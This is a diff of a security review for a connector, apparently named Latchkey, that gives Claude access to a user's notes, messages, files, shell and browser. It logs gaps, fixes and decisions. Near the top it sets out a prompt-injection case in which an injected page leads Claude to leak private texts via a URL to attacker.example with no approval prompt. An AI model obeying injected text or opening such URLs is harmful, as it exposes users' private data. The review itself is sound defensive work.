@@ -21,10 +21,10 @@ Sources: [Willison, the lethal trifecta](https://simonwillison.net/2025/Jun/16/t
 **Latchkey.** Has all three legs in one connector by design.
 - **Done:** others' words are marked as "not instructions" in every result (spotlighting); a
   message can't fake the end of its quote.
-- **Gap (most important):** Claude runs tools marked read-only without asking
+- **Gap (accepted by Toni, 2026-10-23):** Claude runs tools marked read-only without asking
   ([review criteria](https://claude.com/docs/connectors/building/review-criteria): "Read-only tools
-  can run without per-call confirmation, and destructive tools always prompt"). `browser_open`,
-  `browser_back`, and `browser_tabs` are marked read-only, but opening a URL sends data out
+  can run without per-call confirmation, and destructive tools always prompt"). `browser_read`
+  (which opens pages and goes back) is marked read-only, but opening a URL sends data out
   (`https://attacker.example/?d=<your texts>`). So an injected message or page could make Claude
   read private data and leak it with no approval prompt. Opening pages should ask, or be limited.
 - **Gap:** `messages_send` is marked not destructive. Sending to another person is irreversible
@@ -165,9 +165,9 @@ Sources: [Writing effective tools for agents](https://www.anthropic.com/engineer
   gap: pages were up to 100,000 characters (about 25–30k tokens), at or over Claude Code's
   25k-token cap, so long notes, files, and pages can be cut off by Claude rather than by
   Latchkey. A 40,000-character page leaves room.
-- **Gap:** 45 tools is a lot of context in every conversation (no maximum exists). Consolidation
-  candidates: `computer_move/scroll/drag/click` into one action tool, as Claude's own computer-use
-  tool does; `browser_back/tabs` into `browser_open`.
+- **Done (2026-10-23):** 45 tools consolidated into 15: find, read, and change for Notes,
+  Messages, and Files; run and check for Shell; read and act for Browser; look and act for
+  Computer control. Reads stay separate from writes, as the review criteria require.
 - **Gap:** no task evaluations. A small suite of realistic tasks ("add milk to my grocery note",
   "what did Sarah say about Saturday") run with real Claude would catch tool-design problems,
   as the live check did.
@@ -191,9 +191,8 @@ possible (Windows runs MCP servers under a separate agent account in a separate 
 - **Later:** Developer ID, notarization, Sparkle keys (releases, decided as much later).
 - **Note:** no macOS equivalent of Windows' agent account exists for an app that must read the
   owner's own data; levels and visibility are the practical containment.
-- **Gap (privacy):** the local activity log keeps full arguments and results for 90 days,
-  including message and note text. Keeping results shorter (or only metadata after a few days)
-  lowers what a stolen or shared Mac exposes.
+- **Decided (Toni, 2026-10-23):** the local activity log stays thorough: full arguments and
+  results for 90 days, on the Mac only.
 
 ## 7. Open-source hygiene and operations
 
@@ -202,7 +201,9 @@ dependency updates and scanning; a privacy policy (required to be listed in Clau
 for local connectors and expected for remote ones); documented incident response.
 
 **Latchkey.**
-- **Gap:** no `SECURITY.md`, no dependency scanning (Dependabot or `govulncheck` in CI).
+- **Done (2026-10-23):** `SECURITY.md` with GitHub private reporting (GitHub offers the button
+  once the repository is public). **Gap:** no dependency scanning yet (Dependabot or
+  `govulncheck` in CI).
 - **Later:** privacy policy and terms (with the directory listing).
 
 ## Decisions after this review (Toni, 2026-10-23)
@@ -222,6 +223,6 @@ for local connectors and expected for remote ones); documented incident response
 5. Defaults for Shell and Computer control given relay compromise (decided all on; revisit?).
 6. Sensitive-site rule for the browser (banking, government, health).
 7. Prompt-injection test and task evaluations with real Claude.
-8. Local activity log keeps full content for 90 days.
-9. `SECURITY.md` and dependency scanning.
-10. Fewer tools by consolidation.
+8. ~~Local activity log~~: stays thorough (Toni).
+9. ~~`SECURITY.md`~~ done; dependency scanning open.
+10. ~~Fewer tools~~: 15 now (was 45).
